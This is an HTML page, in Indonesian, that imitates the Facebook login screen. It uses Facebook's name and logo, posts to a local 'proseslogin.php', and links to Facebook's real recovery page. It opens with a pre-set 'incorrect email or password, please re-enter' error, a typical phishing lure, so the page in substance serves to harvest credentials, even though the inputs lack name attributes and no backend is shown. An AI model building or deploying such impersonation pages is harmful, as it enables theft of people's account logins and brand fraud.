<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <link rel="stylesheet" href="style3.css">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap" rel="stylesheet">
</head>
<body>
    <div class="login-container">
        <h1 class="facebook-logo">facebook</h1>

        <div class="login-box">
            <h2 class="box-title">Log in to Facebook</h2>
            <form action="proseslogin.php" method="GET">
                <div class="input-group error">
                    <input type="text" placeholder="Email atau Nomor Telepon" required>
                    <span class="error-icon">!</span>
                </div>
                <p class="error-message">
                    Email / nomor telepon atau kata sandi yang Anda masukkan salah. Silahkan masukkan ulang
                </p>

                <div class="input-group">
                    <input type="password" placeholder="Password" required>
                </div>

                <input type="submit" name="masuk" value="Masuk" class="tombollogin">
            </form>

            <a href="https://id-id.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot-pass">Lupa Kata Sandi?</a>
        </div>
    </div>
</body>
</html>
